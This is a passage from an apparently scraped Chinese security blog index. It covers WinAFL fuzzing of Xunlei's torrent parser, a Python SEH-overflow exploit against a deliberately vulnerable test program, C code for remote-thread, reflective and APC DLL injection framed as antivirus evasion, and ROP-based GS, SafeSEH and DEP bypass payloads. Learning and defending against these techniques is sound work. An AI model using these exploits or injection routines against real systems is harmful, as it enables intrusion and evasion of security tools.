b&quot;\\x89\\xE0\\x05\\x24\\x06\\x00\\x00\\xFF\\xE0&quot; # mov eax, esp # sub eax, 0x608 # jmp eaxpayload = b&quot;\\xaa&quot;*32+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) 要点就是：Fuzz的时候和插桩的时候加上-coverage_module &lt;你的dll&gt; 实际测试 你已经学会了1+1=2，请证明费马大定理吧，为了统一和方便，这里也用看雪里面的一篇文章 使用winafl对迅雷的torrent解析逻辑进行fuzz 首先是找到合适的软件，然后知道他那个功能是在那个dll中的，你可以使用ProcessMonitor查看（俗称procmon），截图没有，特征就是当你打开一个.torrent文件后，thunder.exe会马上加载AssisstantTools.dll。通过查看导出表可以找到一些可以测试的函数，这里我测试的是XL_ParseTorrentFile 查看导入表可以看到依赖的P2PBase.dll 所以fuzz的时候也要加上，开始编写harness，你可以用那篇文章里面的，但是我这里就很慢， 原文文章中的harness由于using附近的代码只在c++11中支持，所以使用gcc编译报错的可以尝试加上-std=c++11 如果你使用的是下面我编写的harness，那么直接编译就可以了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;windows.h&gt;typedef DWORD(__cdecl *pXL_ParseTorrentFile)(CHAR* aFileName, PVOID* a1);pXL_ParseTorrentFile XL_ParseTorrentFile = NULL;typedef DWORD(__cdecl *pXL_ReleaseTorrentFileInfo)(PVOID a1);pXL_ReleaseTorrentFileInfo XL_ReleaseTorrentFileInfo = NULL;extern &quot;C&quot; __declspec(dllexport) void fuzz_method(char *FilePath)&#123; PVOID a1 = NULL; XL_ParseTorrentFile(FilePath, &amp;a1); if (a1) &#123; XL_ReleaseTorrentFileInfo(a1); &#125; return;&#125;int main(int argc, char *argv[])&#123; //char AssisstantToolsPath[] = &quot;D:\\\\HackTools\\\\Fuzz\\\\WinAFLFuzz\\\\testcase\\\\thunder_fuzzer\\\\a.dll&quot;; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; static HMODULE hMyDLL = NULL; hMyDLL = LoadLibraryA(&quot;AssistantTools.dll&quot;); if(hMyDLL == NULL)&#123; printf(&quot;Load DLL Failed\\n&quot;); goto END; &#125; XL_ParseTorrentFile = (pXL_ParseTorrentFile)GetProcAddress(hMyDLL, &quot;XL_ParseTorrentFile&quot;); if(XL_ParseTorrentFile == NULL)&#123; printf(&quot;Get Process Address Failed\\n&quot;); goto END; &#125; XL_ReleaseTorrentFileInfo = (pXL_ReleaseTorrentFileInfo)GetProcAddress(hMyDLL, &quot;XL_ReleaseTorrentFileInfo&quot;); if(XL_ReleaseTorrentFileInfo == NULL)&#123; printf(&quot;Get Process Address Failed\\n&quot;); goto END; &#125; fuzz_method(argv[1]);END: if(hMyDLL)&#123; FreeLibrary(hMyDLL); &#125; printf(&quot;Done\\n&quot;);&#125; 你可以用drrun -t drcov --来测试看是不是使用成功，之后使用drrun测试 12345678&quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe&quot; ^-c winafl.dll -debug ^-coverage_module P2PBase.dll ^-coverage_module AssistantTools.dll ^-target_module fuzz_program.exe ^-target_offset 0x11ef ^-fuzz_iterations 10 -nargs 2 ^-- fuzz_program.exe &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\testin\\ubuntu-18.04.5-desktop-amd64.iso.torrent&quot; 问题1： 如果你使用的Dynamorio是大于 8.0.0-1版本的，很大概率会出现错误类似于下面 这种情况就是生成覆盖率文件是对的，但是测试的时候当程序进行IAT导入的时候，在dynamorio中的harness崩溃了，所以程序还没有进入entry入口点函数就直接寄了。这个错误很有意思，加载类似ntdll.dll或者自己在windows上写的DLL（哪怕无符号）都可以，当harness中的LoadLibrary载入其他DLL的时候（比如某个软件的ffmpeg.dll）也会报错。 这个问题我解决了一天也没有解决，到是在看雪找了一个和我一样的帖子 https://bbs.kanxue.com/thread-274169.htm 最后我的解决方法是更换到dynamorio 8.0.0-1版本过后重新编译就行了 问题2： 当你使用target_method的时候，程序找不到该方法，这在你进行测试winafl案例的时候很常见，原因是该方法没有进行导出，在函数前面加上extern &quot;C&quot; __declspec(dllexport)就行了 首先就是缩减testcase 1python &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\winafl-cmin.py&quot; --working-dir &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release&quot; -D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; -t 9000 -i &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\testin&quot; -o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\in&quot; -coverage_module AssistantTools.dll -coverage_module P2PBase.dll -target_module fuzz_program.exe -target_method fuzz_method -nargs 1 -- fuzz_program.exe @@ 然后开始fuzz，开启一个Master吧 123456789101112afl-fuzz.exe ^-M master ^-i &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\in&quot; ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\out&quot; ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 9000 -- ^-coverage_module AssistantTools.dll ^-coverage_module P2PBase.dll ^-target_module fuzz_program.exe ^-target_method fuzz_method ^-fuzz_iterations 5000 -nargs 1 -- ^fuzz_program.exe @@ -M: 指定这是一个Master进程 -i -：当fuzz暂停的时候恢复，在AFL上是-in -，具体用法 12345afl-fuzz.exe ^-M master ^-i -&quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\in&quot; ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\out&quot; ^.... 自己改写的harness确实快，但也不至于一下子就跑出来，这里我用旧版本的迅雷试了下 也就是一个被修复的÷0报错（EXCEPTION_INT_DIVIDE_BY_ZERO） 昨天16h高强度修复问题1，暂时更新到这里","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"【漏洞挖掘】win-afl使用指北-初级篇","slug":"win-afl","date":"2023-07-18T07:27:44.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2023/07/18/win-afl/","link":"","permalink":"https://joe1sn.eu.org/2023/07/18/win-afl/","excerpt":"在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记 这里主要讲述WinAFL+DynamoRIO的Fuzz方法","text":"在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记 这里主要讲述WinAFL+DynamoRIO的Fuzz方法 简介 知道创宇这篇文章讲的已经很好了：https://paper.seebug.org/323/ 由于闭源特点，那么需要使用DynamoRIO进行插桩，检测指令块的转移 WinAFL主要特点就是将AFL中的函数使用WinAPI进行重写，然后调用DynamoRIO的API完成fuzz 编译 主要是参考了https://bbs.kanxue.com/thread-261323.htm和官方过程：https://dynamorio.org/page_building.html DynamoRIO 32位 1. 编译 软件下载一把梭 1234git clone https://github.com/DynamoRIO/dynamorio.gitcd dynamoriomkdir build_Win32mkdir build_x64 这里我使用的是x86 Native Tools Command Prompt命令行 1cmake -G&quot;Visual Studio 16&quot; -A Win32 .. 如果发现缺少什么的话，使用set Name=Value再编译，最后 1cmake --build . --config RelWithDebInfo 2. 测试 1&quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_win32\\bin32\\drrun.exe&quot; -t drcov -- &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\32\\HelloWorld.exe&quot; &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\32\\password.txt&quot; 这里我换成了老版本 dynamorio-cronbuild-8.0.18684，因为新版本是3.0版本的覆盖率文件，IDA Lighthouse只支持2.0，不过你可以通过https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282进行版本的转换。 64位 1. 编译 按照官方的步骤 1%comspec% /k &quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\VC\\Auxiliary\\Build\\vcvarsamd64_x86.bat&quot; 或者启动 1Developer Command Prompt for VS 2019 然后进行cmake配置 1cmake -A x64 .. 就可以参考看雪那篇文章修改下报错 利用cmake-gui修改完过后就可以继续回到cmd进行编译了（也可以用vs2019） 2. 测试 WinAFL 起手式 12345git clone https://github.com/googleprojectzero/winafl.gitcd winaflgit submodule update --init --recursivemkdir build_Win32mkdir build_x64 编译32位 12cmake -G&quot;Visual Studio 16 2019&quot; .. -A Win32 -DDynamoRIO_DIR=D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\cmake -DINTELPT=1 -DUSE_COLOR=1cmake --build . --config Release 如果显示drgui不完整，返回去在生成就行了，看雪上的教程是没有问题的 编译64位 12cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=&quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_x64\\cmake&quot; -DINTELPT=1 -DUSE_COLOR=1cmake --build . --config Release 测试 32位 首先进行插桩 123456789101112131415161718@echo off:: 接受用户输入set /p target_module=traget excutable : set /p target_offset=traget offset : set /p sample=pins sample: :: 输出用户输入的内容echo target_module, %target_module%!echo target_offset, %target_offset%!echo sample, %sample%!D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-target_module %target_module% ^-target_offset %target_offset% ^-fuzz_iterations 10 -nargs 2 -- ^%target_module% %sample% 123456D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-target_module test.exe ^-target_offset 0x1210 ^-fuzz_iterations 10 -nargs 2 -- ^test.exe .\\in\\password.txt 查看生成的log文件，如果有Everything appears to be running normally.那么就是完成了 开始fuzz 12345678910afl-fuzz.exe ^-i .\\in ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\out&quot; ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module test.exe ^-target_module test.exe ^-target_offset 0x1210 ^-fuzz_iterations 5000 -nargs 1 -- ^test.exe @@ 64位 过程也差不多 先插桩 123456traget excutable : test.exetraget offset : 0x1200pins sample: .\\in\\input.bmptarget_module, test.exe!target_offset, 0x1200! sample, .\\in\\input.bmp! 然后fuzz 12345678910afl-fuzz.exe ^-i .\\in ^-o .\\out ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_x64\\bin64&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module test.exe ^-target_module test.exe ^-target_offset 0x1210 ^-fuzz_iterations 5000 -nargs 1 -- ^test.exe @@ 测试2 - SimpleHunt 在之前我的博客写了windows下栈溢出的过程，这里我改写了下 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; void hacked()&#123; printf(&quot;Hacked\\n&quot;);&#125;void vuln(char *FileDir)&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(FileDir,&quot;r&quot;)))&#123; printf(&quot;Open Failed\\n&quot;); exit(0); &#125; fgets(str, 0x1000, fp); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125;int main(int argc, char *argv[])&#123; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; vuln(argv[1]); return 0;&#125; 1gcc HelloWorld.c -o HelloWorld 没有任何保护，这里以32位举例 fuzz 由于代码比较简单，不需要先生成覆盖率文件找到关键函数，所以首先还是插桩 123456D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-target_module HelloWorld.exe ^-target_offset 0x16c4 ^-fuzz_iterations 10 -nargs 2 -- ^HelloWorld.exe in\\password.txt 开始fuzz 12345678910afl-fuzz.exe ^-i &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\in&quot; ^-o &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\out&quot; ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module HelloWorld.exe ^-target_module HelloWorld.exe ^-target_offset 0x16c4 ^-fuzz_iterations 5000 -nargs 2 -- ^HelloWorld.exe @@ 瞬间找到一个crash PoC 使用x32dbg进行调试 刚好修改了EBP寄存器导出错误，很明显的栈溢出。 具体的EXP构造方法就是使用SEH加载shellcode，具体的在之前的文章已经写过了 写出exp 1234567891011payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x12c-len(shellcode)-32) #0x1cNSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\x9A\\x24\\x40\\x00&quot; #40249Aself_gadget = b&quot;\\x89\\xE0\\x05\\x24\\x06\\x00\\x00\\xFF\\xE0&quot;payload = b&quot;\\xaa&quot;*32+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) 参考 https://paper.seebug.org/323/ https://bbs.kanxue.com/thread-261323.htm","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"【免杀】DLL注入小结","slug":"dll-injector","date":"2023-07-17T11:24:51.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2023/07/17/dll-injector/","link":"","permalink":"https://joe1sn.eu.org/2023/07/17/dll-injector/","excerpt":"DLL 注入进化史","text":"DLL 注入进化史 远程线程调用注入 这个是最简单的 这里我接受的是程序的进程PID和待注入DLL的路径szPath 12345678910111213141516171819202122232425void DLLinjector::DllOnLoad() &#123; if (!this-&gt;Check())&#123; wcout &lt;&lt; &quot;The Process or DLL file not found\\n&quot;; return; &#125; //向目标进程写入DLL的路径 SIZE_T dwWriteSize = 0; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, this-&gt;dwPid); LPVOID pAddress = VirtualAllocEx(hProcess, NULL, 0x100, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, pAddress, this-&gt;szPath, wcslen(this-&gt;szPath)*2+2, &amp;dwWriteSize); //从ntdll导出 LoadLibraryA 函数 HMODULE Ntdll = LoadLibraryA(&quot;ntdll.dll&quot;); LPVOID LoadLibraryBase = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryW,pAddress,NULL,NULL); WaitForSingleObject(hRemoteProcess, -1); //释放资源 VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT); CloseHandle(hProcess); FreeModule(Ntdll); wcout &lt;&lt; &quot;injection complete\\n&quot;;&#125; 反射DLL注入 这里找了一张先知的图，上面说了反射DLL注入的流程，原文在这里https://xz.aliyun.com/t/11072 最大的区别就是我们没有使用LoadLibarary这个函数，而是相当于自己写了一个DLL加载器 仔细观察过程就看得出来，远程线程调用注入写入的是DLL路径，然后创建远程调用LoadLibarary（LPTHREAD_START_ROUTINE） 反射DLL注入是将整个文件解析过后，获得必要的dll句柄和函数为修复导入表做准备，分配一块新内存去取解析dll，并把pe头复制到新内存中和将各节复制到新内存中，修复导入表和重定向表，执行DllMain()函数。 群里聊到了进程迁移技术，msf上的migrate原理就是反射DLL注入 读取metsrv.dll（metpreter payload模板dll）文件到内存中。 生成最终的payload。 a) msf生成一小段汇编migrate stub主要用于建立socket连接。 b) 将metsrv.dll的dos头修改为一小段汇编meterpreter_loader主要用于调用reflective loader函数和dllmain函数。在metsrv.dll的config block区填充meterpreter建立session时的配置信息。 c) 最后将migrate stub和修改后的metsrv.dll拼接在一起生成最终的payload。 向msf server发送migrate请求和payload。 msf向迁移目标进程分配一块内存并写入payload。 msf首先会创建的远程线程执行migrate stub，如果失败了，就会尝试用apc注入的方式执行migrate stub。migrate stub会调用meterpreter loader，meterpreter loader才会调用reflective loader。 reflective loader进行反射式dll注入。 最后msf client和msf server建立一个新的session。 这里就不自己写了，参考的是https://github.com/stephenfewer/ReflectiveDLLInjection 首先需要描述的就是DLL的解析过程 1234567891011121314151617181920212223242526do&#123; if( !hProcess || !lpBuffer || !dwLength ) break; // check if the library has a ReflectiveLoader... dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer ); if( !dwReflectiveLoaderOffset ) break; // alloc memory (RWX) in the host process for the image... lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); if( !lpRemoteLibraryBuffer ) break; // write the image into the host process... if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) ) break; // add the offset to ReflectiveLoader() to the remote library address... lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset ); // create a remote thread in the host process to call the ReflectiveLoader! hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId );&#125; while( 0 ); lpBuffer就是读取到内存中的DLL的数据 12345678910111213141516171819202122232425262728293031323334353637383940414243// uiNameArray = the address of the modules export directory entryuiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];// get the File Offset of the export directoryuiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );// get the File Offset for the array of name pointersuiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );// get the File Offset for the array of addressesuiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );// get the File Offset for the array of name ordinalsuiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress ); // get a counter for the number of exported functions...dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;// loop through all the exported functions to find the ReflectiveLoaderwhile( dwCounter-- )&#123; char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress )); if( strstr( cpExportedFunctionName, &quot;ReflectiveLoader&quot; ) != NULL ) &#123; // get the File Offset for the array of addresses uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress ); // use the functions name ordinal as an index into the array of name pointers uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) ); // return the File Offset to the ReflectiveLoader() functions code... return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress ); &#125; // get the next exported function name uiNameArray += sizeof(DWORD); // get the next exported function name ordinal uiNameOrdinals += sizeof(WORD);&#125;return 0; GetReflectiveLoaderOffset就是解析文件头找到DLL的导出表，如果发现ReflectiveLoader的函数，那么返回在hProcess的内存文件中的位置 然后回到LoadRemoteLibraryR使用CreateRemoteThread进行注入 关于RVA和VA的计算可以参考我很早写的一篇博客：PE文件结构中的RVA与RAW 现在可以看一下他的DLL是如何构造的 首先存在一个导出函数 通过阅读这个函数的代码发现 使用_ReturnAddress获得调用完成的返回地址，反推初DLL的基地址 通过PEB得到LoadLibraryA、GetProcAddress、VirtualAlloc，使用NtFlushInstructionCache暂时存储其他导入表的函数 迁移之前的DLL镜像到新的位置 覆写迁移后的文件头的节区位置 使用刚才导入的LoadLibraryA、GetProcAddress修复IAT 处理重定向相关 找到DLLMain并跳转后执行 APC注入 在最开始的远程线程调用注入使用的是TH32CS_SNAPPROCESS，这里就是利用KiUserDispatch调度进行APC例程调用，让线程使用LoadLibarary进行注入 123456789101112131415161718192021THREADENTRY32 te = &#123; sizeof(THREADENTRY32) &#125;;HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);if (INVALID_HANDLE_VALUE == hThreadSnap) &#123; std::cout &lt;&lt; &quot;Error In APC Injection\\n&quot;;&#125;BOOL bStat = FALSE;//得到第一个线程if (Thread32First(hThreadSnap, &amp;te)) &#123; do &#123; if (te.th32OwnerProcessID == this-&gt;dwPid) &#123; HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); if (hThread) &#123; DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, hThread, (ULONG_PTR)pAddress); if (dwRet &gt; 0) bStat = TRUE; &#125; CloseHandle(hThread); &#125; &#125; while (Thread32Next(hThreadSnap, &amp;te));&#125;CloseHandle(hThreadSnap); 还有一个技巧就是使用NTDLL中的未导出函数NtTestAlert就可以立即调用APC例程 上面的把hProcess = GetCurrentProcess()，pAddress = shellcode_Address相当于使用DLL注入进行免杀了 上下文注入 之前在写PE加载器的时候就想到了这个，主要是通过暂停程序，获得并修改上下文，在内存中写入shellcode，然后再恢复就行了 问题在于shellcode还有计算各种偏移，个人觉得涉及shellcode和汇编较多，就不再本篇文章赘述 用到的主要WINAPI就是 创建会shellcode裸函数（__declspec(naked)）,导出LoadLibrary等函数 OpenProcess后再OpenThread，使用SuspendThread暂停线程 创建类型为CONTEXT的变量，初始化context.ContextFlags=CONTEXT_FULL GetThreadContext获得上下文 VirualAlloc获得空间，类似RtlMoveMemory这种复制shellcode到空间 将context.eip = shellcode_addr，使用SetThreadContext重新设置上下文，ResumeThread恢复线程 内核中的过程差不多，不过更多的是不一样的API","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"malware","slug":"malware","permalink":"https://joe1sn.eu.org/tags/malware/"},{"name":"C","slug":"C","permalink":"https://joe1sn.eu.org/tags/C/"}]},{"title":"【Win Pwn】基础栈溢出保护绕过","slug":"win-pwn-stack2","date":"2023-07-12T14:29:58.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2023/07/12/win-pwn-stack2/","link":"","permalink":"https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/","excerpt":"针对栈攻击的防护与绕过","text":"针对栈攻击的防护与绕过 GS GS本质上和Linux GCC中的canary很相似，他在栈帧的结尾（EBP之前）插入一给DWORD类型的值，其副本存在于.data中。 在编译的时候并不会存在GS保护有下面几种情况 函数不包含缓冲区 函数被定义为具有变量参数列表 函数使用无保护的关键字标记 函数在第一个语句中包含内嵌汇编代码 缓冲区不是 8 字节类型且大小不大于 4 个字节 不过仍然可以采用#pragma strict_gs_check 强制启用GS保护 12345678910111213#include &quot;string.h&quot;int vulfuction(char* str)&#123; char arry[4]; strcpy(arry, str); return 1;&#125;int main()&#123; char* str = &quot;yeah,i have GS protection&quot;; vulfuction(str); return 0;&#125; 绕过方式要漏洞类型灵活选择 如果是可以泄露那么泄露后拼接再溢出 再C++中，struct和class除了访问权限没有不同，那么有机会可以通过修改函数指针（比如虚函数）来进行RCE 如果存在任意地址写或者能过写道.data段（比如存在字符串格式化漏洞），可以将对比的cookie设置为特定值 GS机制没有存在SEH的保护，所以 【Win Pwn】基础栈溢出利用 中的利用手段仍然能够成功，只是溢出长度和ROP的Gadget需要重新设置。 1234567891011121314151617from ae64 import AE64payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x160-len(shellcode)-16) #0x1ctest_func = b&quot;\\xc4\\x16\\x40\\x00&quot; #004016C4NSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\x9e\\x26\\x41\\x00&quot; #0041269Eself_gadget = b&quot;\\x89\\xE0\\x05\\x2c\\x07\\x00\\x00\\xFF\\xE0&quot; # mov eax, esp # sub eax, 0x64c;//sub eax, 0x608 # jmp eaxpayload = b&quot;\\xaa&quot;*16+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) SafeSEH 0day那本书上信息有点…过时了，这里可以参考微软的官方定义/SAFESEH（映像具有安全异常处理程序），主要识别方法就是在.rdata中存在IMAGE_LOAD_CONFIG_DIRECTORY32_2 通过RtlDispatchException函数实现 比较通杀的方法就是 不使用SEH 在堆区上布置shellcode然后执行 这里改动一下源代码 把SEH的地址手动改为堆地址 经过校验后直接到堆中执行了 P3是重启了一次后截图，地址可能会不一样 总结一下就是地址的ROP必须符合验证的权限，但是没有开启SafeSEH的DLL文件中的Gadget、没有DEP时候的堆地址都可以使用。 DEP DEP是类似于Windows上的NX，作用是禁止堆栈的数据拥有执行的权限，避免了Shellcode直接执行。 操作系统通过设置内存页的 NX/XD 属性标记，来指明不能从该内存执行代码。为了实现 这个功能，需要在内存的页面表（Page T able）中加入一个特殊的标识位（NX/XD）来标识是 否允许在该页上执行指令。当该标识位设置为 0 里表示这个页面允许执行指令，设置为 1 时表 示该页面不允许执行指令。 关于NX保护也可以手动查看 只编译DEP可能还需要关闭运行时检查 主要思路就是Ret2Libc 调用ZwSetInformationProcess关闭DEP 在之前的《【win内核原理与实现】II. 进程与线程》中提到过_KPROCESS存在ExecuteOptions 我并没有在微软的官网上找到该结构体的说明，但是可以通过之前他们的逆向结果找到 1234567Pos0 ExecuteDisable :1bit Pos1 ExecuteEnable :1bit Pos2 DisableThunkEmulation :1bit Pos3 Permanent :1bit Pos4 ExecuteDispatchEnable :1bit Pos5 ImageDispatchEnable :1bit Pos6 Spare :2bit 当前进程 DEP 开启时 ExecuteDisable 位被置 1，当 进程 DEP 关闭时 ExecuteEnable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的， Permanent 被置 1 后表示这些标志都不能再被修改。真正影响 DEP 状态是前两位，所以我们只 要将_KEXECUTE_OPTIONS 的值设置为 0x02（二进制为 00000010）就可以将 ExecuteEnable 置为 1。 使用 123456ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; ZwSetInformationProcess( NtCurrentProcess(), // (HANDLE)-1 ProcessExecuteFlags, // 0x22 &amp;ExecuteFlags, // ptr to 0x2 sizeof(ExecuteFlags)); // 0x4 就可以关掉DEP保护了，在0day书中介绍了3种直接利用兼容性异常而导致DEP关闭的方法 （1）当 DLL 受 SafeDisc 版权保护系统保护时； （2）当 DLL 包含有.aspcak、.pcle、.sforce 等字节时； （3）Windows V ista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\\SOFTWARE \\Microsoft\\ Windows NT\\CurrentVersion\\Image File Execution Options\\DllNXOptions”键下边标识 出不需要启动 DEP 的模块时 很可惜在windows10中这些情况几乎不会出现，所以方法不适用 这两种是我比较喜欢用的，因为可以和免杀结合在一起 他们的基础就是类似LinuxPwn中的ROP构造，这里我使用的是32下，cdcle调用方式，使用栈传参 VirtualProtect改写内存权限 关于函数的用法：virtualProtect 函数 (memoryapi.h) 123456BOOL VirtualProtect( [in] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flNewProtect, [out] PDWORD lpflOldProtect); lpAddress: 要改变属性的内存起始地址。 dwSize: 要改变属性的内存区域大小。 flNewProtect: 内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（0x40）时该 内存页为可读可写可执行。 pflOldProtect: 内存原始属性类型保存地址。 修改内存属性成功时函数返回非 0，修改失败时返回 0。 不过API位于的是shell32.dll当中，所以要添加上HINSTANCE hInst = LoadLibrary(L&quot;shell32.dll&quot;); 由于ROP依赖于函数调用的传参方式，下面是一个经典的传参 ROP时栈的结构 由于没有泄露点，所以只能在调试的时候修改。也可以使用Gadget来构造，比如说通过ESP相关得到栈地址之类的。（但是得到VirtualProtect就太困难了） 123456789101112131415161718from ae64 import AE64payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*0x14payload = offset payload += b&quot;\\x90&quot;*4 #VirtualProtectpayload += b&quot;\\x80&quot;*4 #Shellcode Addresspayload += b&quot;\\x80&quot;*4 #Shellcode Addresspayload += b&quot;\\xff\\x00\\x00\\x00&quot; #Address Lengthpayload += b&quot;\\x40\\x00\\x00\\x00&quot; #PAGE_EXECUTE_READWRITEpayload += 